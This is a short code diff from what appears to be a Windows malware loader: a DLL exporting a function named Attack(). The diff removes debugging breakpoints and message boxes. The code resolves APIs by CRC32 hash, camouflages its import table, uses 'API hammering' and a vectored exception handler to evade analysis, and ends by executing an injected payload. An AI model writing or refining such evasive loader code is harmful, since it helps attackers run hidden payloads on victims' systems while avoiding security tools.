@@ -25,13 +25,9 @@ extern __declspec(dllexport) int Attack()
 
     IatCamouflage();
 
-    MessageBoxA(NULL, "Hello", "Hello", MB_OK);
-    __debugbreak();
     HMODULE kernel32_handle = GetModuleHandleH(kernel32_CRC32);
-    __debugbreak();
     fnAddVectoredExceptionHandler        pAddVectoredExceptionHandler     = (fnAddVectoredExceptionHandler)GetProcAddressH( kernel32_handle, AddVectoredExceptionHandler_CRC32);
     fnRemoveVectoredExceptionHandler     pRemoveVectoredExceptionHandler  = (fnRemoveVectoredExceptionHandler)GetProcAddressH(kernel32_handle, RemoveVectoredExceptionHandler_CRC32);
-    __debugbreak();
 
     ApiHammering(1000);
 
@@ -40,8 +36,6 @@ extern __declspec(dllexport) int Attack()
         MessageBoxA(NULL, "ERROR", "ERROR", MB_OK);
         return -1;
     }
-
-    MessageBoxA(NULL, "Hello", "Hello", MB_OK);
 
     pVehHandler = pAddVectoredExceptionHandler(1, VectoredExceptionHandler);
     if (pVehHandler == NULL)
@@ -64,6 +58,8 @@ extern __declspec(dllexport) int Attack()
     }
 
     ApiHammering(1000);
+
+    MessageBoxA(NULL, "Hello", "Hello", MB_OK);
 
     Execute(pInjectedPayload);
 
